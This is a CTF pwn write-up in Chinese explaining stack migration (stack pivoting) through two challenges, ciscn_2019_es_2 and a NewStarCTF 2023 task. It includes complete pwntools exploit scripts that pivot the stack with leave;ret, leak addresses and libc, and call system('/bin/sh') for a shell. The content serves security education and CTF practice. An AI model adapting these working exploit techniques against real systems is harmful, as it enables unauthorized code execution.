---
title: Stack Migration
tags: [ctf-pwn,stack]
date: 2023-10-11 14:10:00
categories: [ctf-pwn]
excerpt: 栈迁移/栈劫持
---

### Stack Migration

#### ciscn_2019_es_2

https://buuoj.cn/challenges#ciscn_2019_es_2

![](/img/ctf-pwn/stack_migration/1.jpg)

溢出的长度不足以写rop链，劫持rbp到一个足够大的空间里去

首先通过调试查看ebp到可输入空间开头的距离

```python
gdb.attach(p, "b *0x080485FC") # 在python pwntools里下断点的方法（要放在开头），进去按一下c
```

![](/img/ctf-pwn/stack_migration/2.jpg)

程序输出的rbp为`0xffdb7098`，和图中aaaa的位置相差0x38，一会就要将ebp覆盖为ebp-0x38，从而开辟足够的空间来构造rop

然后`vul()`函数原本的返回地址被`&(leave ret)`取代了这样在`vul()`执行结束时，相当于多执行一次leave ret

过程如下：

```
1. vul()原本的leave
esp->ebp-0x38   ebp->aaaa   esp->leave ret
2. vul()原本的ret
eip->leave ret  esp->比返回地址再低4个字节的位置上
3. leave
esp->aaaa    ebp == aaaa  esp->system@plt
4. ret 
eip->system@plt   esp->system的返回地址（瞎写的）
```

这时，就相当于一个普通的rop了，system@plt为一个被溢出的返回地址，在他后面的是system的返回地址和它的参数，而"/bin/sh\x00"为一个字符串，需要一个指针指向它，因此需要计算一下binsh的地址。

由于aaaa是ebp-0x38，binsh距离aaaa有16个字节，那么这个地方填上ebp-0x28，就能给system传进去binsh的参数了。



**exp**

```python
from pwn import *
r = process("./ciscn_2019_es_2")
#r=remote('node4.buuoj.cn',25391)
gdb.attach(r, "b *0x080485FC") 
sys=0x8048400
leave_ret=0x08048562
main=0xdeadbeef

payload='a'*0x27+'b'
r.send(payload)
r.recvuntil("b")
ebp = u32(r.recv(4))
print(hex(ebp))

payload2=b'aaaa'+p32(sys)+p32(main)+p32(ebp-0x28)+b"/bin/sh"
payload2=payload2.ljust(0x28,b'\x00')
payload2+=p32(ebp-0x38)+p32(leave_ret)

r.send(payload2)
r.interactive()
```

#### 





#### NewStarCTF 2**023** 

stack migration

![](/img/ctf-pwn/stack_migration/3.jpg)

和前面的唯一区别在于需要先泄露libc地址，题目又给了libc

需要注意的还是不要sendline，因为会多一个\n，占掉了下一次输入，payload2就输入不进去了

```python
from pwn import *
#p = process("./pwn")
p = remote("node4.buuoj.cn",25029)

#gdb.attach(p, "b *0x4012a9")
e = ELF("./pwn")

#context.log_level="debug"

leave_ret = 0x4012aa
poprdi_ret = 0x401333
puts_got = e.got["puts"]
puts_plt = e.plt["puts"]
#main = e.sym["main"]
main = 0x4012ac
start = 0x4010b0

p.recvuntil(b"your name:\n")
payload = b"12345678"
p.send(payload)
p.recvuntil(b"I have a small gift for you: ")
buf_addr = eval(p.recv(14))
print(hex(buf_addr))


p.recvuntil(b"more infomation plz:\n")
payload2 = ( p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)).ljust(80,b'a')
payload2+= p64(buf_addr) + p64(leave_ret)
p.send(payload2)


p.recvuntil(b"maybe I'll see you soon!\n")

puts_addr = u64(p.recvuntil(b"\x7f").ljust(8,b"\x00"))

print("puts:----" + str(hex(puts_addr)))


libc = ELF("libc.so.6")
libc.address =  puts_addr - libc.sym['puts']
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))


p.recvuntil(b"your name:\n")
payload = b"12345678"
p.send(payload)
p.recvuntil(b"I have a small gift for you: ")
buf_addr = eval(p.recv(14))
print(hex(buf_addr))

p.recvuntil(b"more infomation plz:\n")
payload2 = (p64(poprdi_ret) + p64(binsh) + p64(system)).ljust(80,b"a")
payload2+= p64(buf_addr) + p64(leave_ret)
p.sendline(payload2)

p.interactive()

```

